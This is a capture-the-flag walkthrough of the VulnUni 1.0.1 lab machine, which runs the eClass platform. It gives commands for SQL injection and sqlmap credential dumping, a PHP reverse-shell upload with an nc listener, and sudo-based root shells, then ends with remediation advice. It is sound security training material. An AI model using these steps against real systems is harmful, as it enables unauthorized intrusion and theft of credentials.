# VulnUni: 1.0.1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.x |
| **Attacker IP** | 192.168.1.y |
| **Difficulty** | Easy/Medium |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/vulnuni-1-0-1-vulnhub-walkthrough/) |

## Attack Summary

VulnUni: 1.0.1 runs an **eClass** open-source e-learning platform. A **SQL injection** vulnerability in the login form allows extraction of admin credentials from the database. With admin access, an **authenticated file upload** function accepts a PHP reverse shell, granting initial access as `www-data`. Privilege escalation leverages a SUID binary or sudo misconfiguration to obtain root.

## Methodology

1. Host discovery and nmap scan
2. Web enumeration of eClass application
3. SQL injection in login form to extract credentials
4. Authenticated PHP file upload for reverse shell
5. Privilege escalation to root

---

## Step 1: Host Discovery

```bash
netdiscover -r 192.168.1.0/24
```

Identify the target IP from the MAC address vendor.

## Step 2: Port Scanning

```bash
nmap -A <TARGET_IP>
```

![nmap scan results](images/01-nmap.png)

Open port: **80** (HTTP running eClass).

## Step 3: Web Application Enumeration

Browse to `http://<TARGET_IP>`. The site runs **eClass**, an open-source learning management system. Identify the version from page source or footer.

```bash
dirb http://<TARGET_IP>
```

Enumerate directories to understand the application structure.

## Step 4: SQL Injection — Credential Extraction

The eClass login form at `/index.php` is vulnerable to SQL injection in the username field.

Test with a basic payload:

```
Username: admin'--
Password: anything
```

Use `sqlmap` to automate extraction:

```bash
sqlmap -u "http://<TARGET_IP>/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       --dbs
```

Enumerate the eClass database:

```bash
sqlmap -u "http://<TARGET_IP>/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       -D eclass --tables
```

Dump the user table:

```bash
sqlmap -u "http://<TARGET_IP>/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       -D eclass -T user --dump
```

![SQL injection credential extraction](images/02-sqli.png)

Recovered admin credentials (password may be MD5-hashed; crack with `john` or `hashcat -m 0`).

## Step 5: Authenticated File Upload — Reverse Shell

Log in to eClass with the recovered admin credentials. Navigate to the file upload functionality (course material upload or profile image upload).

Prepare a PHP reverse shell (e.g., from `/usr/share/webshells/php/php-reverse-shell.php`):

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit shell.php: set $ip and $port to attacker values
```

Upload `shell.php` through the eClass admin panel.

![File upload interface](images/03-upload.png)

Start a listener:

```bash
nc -lvp 4444
```

Browse to the uploaded file path (check the upload directory from source or directory listing):

```
http://<TARGET_IP>/courses/tmpUnzipping/<session>/shell.php
```

![Reverse shell received](images/04-shell.png)

Shell returns as `www-data`. Upgrade to TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Step 6: Privilege Escalation

Check for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Check sudo permissions:

```bash
sudo -l
```

If `python`, `perl`, `find`, or similar binaries are available with sudo, use GTFOBins techniques:

```bash
# Example with python:
sudo python -c 'import os; os.system("/bin/bash")'

# Example with find:
sudo find /etc -exec /bin/bash \; -quit
```

Alternatively, if a kernel exploit is applicable, identify the kernel version:

```bash
uname -a
```

Search for matching exploits on Exploit-DB and compile as needed.

## Step 7: Root Flag

```bash
cd /root
ls
cat flag.txt
```

![Root flag](images/05-root-flag.png)

---

## Lessons Learned

- **SQL injection in authentication forms** is a critical vulnerability that can bypass login entirely or expose password hashes.
- **Unrestricted file upload** in web applications, especially when uploaded files are executable by the web server, provides direct RCE.
- **Default or weak credentials** recovered through SQL injection highlight the importance of using strong, unique passwords.
- **SUID binaries and misconfigured sudo** remain common privilege escalation vectors in CTF-style machines.

---

## Remediation

| Vulnerability | Fix |
|---|---|
| SQL injection in login | Use parameterized queries / prepared statements; never concatenate user input into SQL |
| Unrestricted file upload | Validate file type server-side; store uploads outside web root; rename uploaded files |
| Weak/default credentials | Enforce strong password policy; hash passwords with bcrypt, not MD5 |
| Overly permissive sudo rules | Apply principle of least privilege; audit sudo rules regularly |
